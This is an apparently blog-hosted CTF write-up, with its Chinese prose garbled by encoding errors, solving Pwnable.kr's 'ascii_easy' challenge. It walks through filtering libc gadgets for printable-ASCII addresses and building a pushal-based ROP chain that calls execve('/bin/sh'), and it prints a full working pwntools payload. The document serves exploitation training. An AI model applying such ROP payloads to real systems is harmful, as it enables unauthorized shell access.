        <content type="html"><![CDATA[<h1 id="Pwnable-kr-ascii-easy"><a href="#Pwnable-kr-ascii-easy" class="headerlink" title="Pwnable.kr ascii_easy"></a>Pwnable.kr ascii_easy</h1><p>ç›´æ¥ <code>ida</code> ä¸­æŸ¥çœ‹æºç ï¼Œ<code>vuln</code> ä¸­å­˜åœ¨ <code>bof</code>:</p><p><img src="0x00.png" alt="0x00"></p><p>æºç å¾ˆç®€å•ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li>å¼€äº† <code>nx</code></li><li><code>mmap</code> åœ¨ <code>0x5555e000</code> åˆ†é…äº†ä¸€å—å†…å­˜ï¼ŒåŠ è½½ <code>libc-2.15.so</code>ï¼Œæœ‰å…¨éƒ¨æƒé™ï¼ˆå¯æ‰§è¡Œï¼‰</li><li>è¾“å…¥åªèƒ½æ˜¯ <code>32</code> ~ <code>127</code> çš„ <code>ascii</code> </li><li>æ ˆæº¢å‡ºæ²¡æœ‰é•¿åº¦é™åˆ¶</li></ul><p>é¦–å…ˆï¼Œæ‹¿åˆ°é¢˜ç›®æ—¶ï¼Œè§‰å¾—åº”è¯¥çœ‹ä¸€ä¸‹ <code>libc</code> ä¸­å“ªäº›å‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œç®€å•çš„å†™äº†ä¸€ä¸ªç­›é€‰çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">objdump -T libc<span class="number">-2.15</span>.so &gt; symbols</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="comment"># ç­›é€‰è„šæœ¬(å¤§è‡´ä¸€æ · ...)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fliter</span><span class="params">(addr)</span>:</span></span><br><span class="line">    a_78 = int(addr[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">    a_56 = int(addr[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    a_34 = int(addr[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    a_12 = int(addr[<span class="number">8</span>:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> is_ascii(a_78) <span class="keyword">and</span> is_ascii(a_56) <span class="keyword">and</span> is_ascii(a_34) <span class="keyword">and</span> is_ascii(a_12):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_ascii</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (num &gt; <span class="number">31</span> <span class="keyword">and</span> num &lt; <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"xxx"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    addr = hex(<span class="number">0x5555e000</span> + int(i[<span class="number">2</span>:<span class="number">10</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> fliter(addr):</span><br><span class="line">        <span class="keyword">print</span> addr + i[<span class="number">10</span>:].strip(<span class="string">'\n'</span>)</span><br><span class="line">        </span><br><span class="line">------------------------------------------------</span><br><span class="line">python func.py &gt; filter</span><br><span class="line">cat filter | grep xxx</span><br></pre></td></tr></table></figure><p>ç®€å•çš„çœ‹äº†ä¸€ä¸‹ <code>/bin/sh</code>ã€<code>execv</code>ã€<code>system</code>ï¼š</p><p><img src="0x01.jpg#pic_center" alt="0x01"></p><p><code>/bin/sh</code> ã€<code>system</code> ä¸èƒ½ç›´æ¥ä½¿ç”¨ <code>ascii</code> è¾“å…¥ï¼Œ <code>execv</code> å¯ä»¥ â€¦</p><p>è¿™æ—¶ï¼Œå‘ç°é¢˜ç›®æœ‰æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint : you don&#39;t necessarily have to jump at the beggining of a function. try to land anyware.</span><br></pre></td></tr></table></figure><p>i.e. æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>ROP</code> ï¼Œé€šè¿‡åŠ åŠ å‡å‡ä¹‹ç±»çš„è®© <code>/bin/sh</code> ã€<code>system</code> è¿™äº›å‡½æ•°çš„åœ°å€å‡ºç°ï¼›äºæ˜¯ï¼Œæˆ‘é€‰æ‹©äº† <code>/bin/sh</code> å’Œ <code>execv</code>ã€‚</p><p>ç°åœ¨è¦æ„é€  ROP chainï¼Œç”¨ <code>ROPgadget</code> å’Œä¸Šé¢çš„é‚£ä¸ªè„šæœ¬ï¼ˆç¨å¾®æ”¹æ”¹â€¦ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc-2.15.so &gt; gadgets</span><br><span class="line">python func.py &gt; filtered_gadgets</span><br><span class="line">cat filtered_gadgets | grep xxx | grep xxx</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨æ„é€  ROP Chainï¼ˆåˆºæ¿€ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"><span class="comment"># 0x2b366078 + 0x2a35577e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execv) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å°±æ˜¯ï¼š</p><ul><li>â€˜aâ€™*0x1cï¼šå¡«å……ç¼“å†²åŒº</li><li>â€˜bbbbâ€™ï¼šold_ebp</li><li>p32(0x5557506b)ï¼šç¬¬ä¸€ä¸ª <code>gadget</code> ï¼Œä¸»è¦ç›®çš„æ§åˆ¶ <code>eax</code> å’Œ <code>esi</code> ï¼Œä¹‹åç”¨ <code>add eax, esi</code> æ„é€ å‡º <code>/bin/sh</code> çš„åœ°å€</li><li>p32(0x2b366074)ï¼š<code>pop eax</code> ï¼Œæ‰‹åŠ¨æ„é€ çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¯ä»¥éšä¾¿é€‰ï¼‰</li><li>â€˜ebx â€˜ ï¼š<code>pop ebx</code></li><li>p32(0x2a35577e)ï¼š<code>pop esi</code> ï¼Œæ‰‹åŠ¨æ„é€ çš„ç¬¬äºŒä¸ªæ•°æ®</li><li>â€˜edi â€˜ï¼š<code>pop edi</code></li><li>p32(0x5557506d)ï¼šç¬¬å…­ä¸ª <code>gadget</code>ï¼Œ<code>pop ebp</code> ä¸ºåé¢çš„ <code>pushal</code> åçš„ <code>ret</code> æœåŠ¡</li><li>p32(0x555f3237)ï¼šç¬¬äºŒä¸ª <code>gadget</code>ï¼Œä¸»è¦ä½¿ç”¨ <code>add</code></li><li>â€˜ebx â€˜ï¼š<code>pop ebx</code></li><li>â€˜esi â€˜ï¼š<code>pop esi</code></li><li>p32(0x5557506f)ï¼šç¬¬äº”ä¸ª <code>gadget</code>ï¼Œ<code>pop1</code></li><li><p>p32(0x556d2a51)ï¼šç¬¬ä¸‰ä¸ª <code>gadget</code>ï¼Œæ§åˆ¶ <code>ecx</code>ï¼Œæ­¤æ—¶ <code>/bin/sh</code> çš„åœ°å€ä¹Ÿæ„å»ºæˆåŠŸï¼ˆ0x2b366074 + 0x2a35577e - 0x10 + 0xaï¼‰</p></li><li><p>p32(execv)ï¼šä¸»è¦æ˜¯æ ¹æ® <code>pushal</code> ä¹‹åçš„æ ˆå¸ƒå±€ï¼Œå†³å®šæŠŠ <code>execv</code> çš„åœ°å€ä¼ ç»™ <code>ecx</code></p></li><li><p>p32(0x5563704c)ï¼šç¬¬å››ä¸ª <code>gadget</code>ï¼Œ<code>pushal</code></p><p>æŒ‡ä»¤æ‰§è¡Œçš„åœ°å€å˜åŒ–ï¼š</p><p><code>0x5557506b</code> =&gt; <code>0x555f3237</code> =&gt; <code>0x556d2a51</code> =&gt; <code>0x5563704c</code> =&gt; <code>0x5557506f</code> =&gt; <code>0x5557506d</code></p></li></ul><p>ç»“æœå‘ç°ä¸è¡Œï¼Œè°ƒè¯•æ—¶å‘ç°ç¨‹åºåˆ <code>push</code> äº† <code>ebx</code>ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹ä»£ç ï¼š</p><p><img src="0x02.png" alt="0x02"></p><p>å¹¶æ²¡æœ‰ç›´æ¥ <code>sub xxx</code>ã€‚åæ¥æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰ <code>execve</code> æ˜¯å†…æ ¸çº§ç³»ç»Ÿè°ƒç”¨ï¼Œå‰©ä¸‹çš„å‡ ä¸ª <code>exec</code> éƒ½åªæ˜¯é€šè¿‡è°ƒç”¨ <code>execve</code> å®ç°çš„ã€‚</p><p>äºæ˜¯ï¼Œæƒ³è¦é€šè¿‡æŸ¥æ‰¾ <code>sub</code> | <code>add ecx</code> æ¥ä¿®æ”¹ <code>ecx</code> çš„å€¼ï¼Œç»“æœå¹¶æ²¡æœ‰æ‰¾åˆ°ã€‚åæ¥å‘ç°è‡ªå·±çš„ä¹‹å‰çš„æ ˆæ„é€ é”™äº†ï¼Œå¹¶æ²¡æœ‰ç•™ <code>execv</code> çš„è¿”å›åœ°å€ â€¦â€¦ æˆ‘è¿˜åœ¨æƒ³æˆ‘å¤ªèœäº†ã€‚çªç„¶æƒ³èµ·ï¼Œç›´æ¥æ‰¾ä¸ª <code>call execve</code> ä¸å°±è¡Œäº†å˜›ï¼Œè¿æ ˆå¸ƒå±€éƒ½ä¸ç”¨æ”¹ã€‚æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªï¼š</p><p> <img src="0x03.jpg#pic_center" alt="0x03"></p><p>çº¢æ¡†çš„å°±å¯ä»¥ç”¨ã€‚ä¿®æ”¹åçš„ <code>payload</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line">execve = <span class="number">0x5561676a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x556c5375 : xor edi, ebp ; jmp eax</span></span><br><span class="line"><span class="comment"># 0x55687926 : push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execve) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p>è¾“å‡ºéƒ½æ˜¯ <code>ascii</code> ï¼Œç›´æ¥æŠŠ <code>payload</code> å¤åˆ¶ä¸€ä¸‹ï¼Œç‰¹æ®Šå­—ç¬¦åŠ ä¸ªè½¬ä¹‰ç¬¦å·å°±è¡Œï¼š</p><p><img src="0x04.jpg#pic_center" alt="0x04"></p><p>nice~ :ï¼‰</p><h2 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h2><ul><li><a href="https://www.fermimn.edu.it/linux/quarta/x86/pusha.htm" target="_blank" rel="noopener">80386 Programmerâ€™s Reference Manual â€” Opcode PUSHA</a></li></ul>]]></content>
      
      
